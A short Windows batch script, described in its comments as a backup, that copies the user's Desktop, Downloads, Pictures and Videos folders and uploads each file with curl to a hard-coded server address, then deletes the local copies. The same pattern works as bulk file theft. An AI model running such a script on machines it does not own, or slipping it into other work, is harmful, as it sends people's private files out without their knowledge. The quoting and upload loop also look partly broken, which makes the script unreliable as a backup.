@echo off
REM Set the target URL of your Python server
set server_url=http://192.168.100.1:8888/upload

REM Define the directories to copy files from
set directories="%USERPROFILE%\Desktop" "%USERPROFILE%\Downloads" "%USERPROFILE%\Pictures" "%USERPROFILE%\Videos"

REM Create a temporary directory to store the files before upload
set temp_dir=%TEMP%\backup_files
mkdir %temp_dir%

REM Copy files from each directory to the temporary directory
for %%d in (%directories%) do (
    xcopy "%%d\*" "%temp_dir%\" /S /Y /I
)

REM Upload the files to the Python server
for %%f in (%temp_dir%\*) do (
    curl -X POST -F "file=@%%f" %server_url%
)

REM Clean up the temporary directory
rd /S /Q %temp_dir%

echo Backup completed.
pause
